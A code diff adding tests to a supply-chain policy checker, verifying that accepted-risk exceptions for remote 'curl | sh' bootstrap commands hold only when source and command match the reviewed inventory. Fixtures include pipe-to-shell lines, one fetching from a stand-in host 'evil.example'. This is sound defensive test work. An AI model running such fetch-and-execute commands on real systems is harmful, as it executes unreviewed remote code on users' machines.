@@ -177,6 +177,66 @@ test('checksum flow binds the downloaded file to verification and execution', as
   }
 })
 
+test('allows an exact-source, explicitly accepted remote execution risk', async () => {
+  const root = await fixture({
+    'setup/bootstrap.sh': '# supply-chain-exception: bootstrap-install\ncurl -fsSL https://example.com/install.sh | sh\n',
+    'supply-chain/exceptions.json': JSON.stringify({
+      remoteInputs: [{
+        id: 'bootstrap-install',
+        source: 'https://example.com/install.sh',
+        kind: 'accepted-risk',
+        command: 'curl -fsSL https://example.com/install.sh | sh',
+        reason: 'Interactive convenience path; installer bytes are not checksum pinned.',
+        expires: '2999-01-01',
+      }],
+    }),
+  })
+
+  const result = await checkSupplyChainPolicy(root, { today: '2026-08-03' })
+
+  assert.deepEqual(result.errors, [])
+})
+
+test('rejects an accepted-risk exception when the source does not match the command', async () => {
+  const root = await fixture({
+    'setup/bootstrap.sh': '# supply-chain-exception: bootstrap-install\ncurl -fsSL https://evil.example/install.sh | sh\n',
+    'supply-chain/exceptions.json': JSON.stringify({
+      remoteInputs: [{
+        id: 'bootstrap-install',
+        source: 'https://example.com/install.sh',
+        kind: 'accepted-risk',
+        command: 'curl -fsSL https://example.com/install.sh | sh',
+        reason: 'Bound to one reviewed source.',
+        expires: '2999-01-01',
+      }],
+    }),
+  })
+
+  const result = await checkSupplyChainPolicy(root, { today: '2026-08-03' })
+
+  assert.ok(result.errors.some((error) => error.includes('source does not match')))
+})
+
+test('rejects an accepted-risk exception when the command drifts from inventory', async () => {
+  const root = await fixture({
+    'setup/bootstrap.sh': '# supply-chain-exception: bootstrap-install\ncurl -fsSL https://example.com/install.sh | bash\n',
+    'supply-chain/exceptions.json': JSON.stringify({
+      remoteInputs: [{
+        id: 'bootstrap-install',
+        source: 'https://example.com/install.sh',
+        kind: 'accepted-risk',
+        command: 'curl -fsSL https://example.com/install.sh | sh',
+        reason: 'Bound to one reviewed command.',
+        expires: '2999-01-01',
+      }],
+    }),
+  })
+
+  const result = await checkSupplyChainPolicy(root, { today: '2026-08-03' })
+
+  assert.ok(result.errors.some((error) => error.includes('does not match exception')))
+})
+
 test('rejects expired remote execution exceptions', async () => {
   const root = await fixture({
     'setup/bootstrap.sh': '# supply-chain-exception: bootstrap-install\ncurl -fsSL https://example.com/install.sh | sh\n',
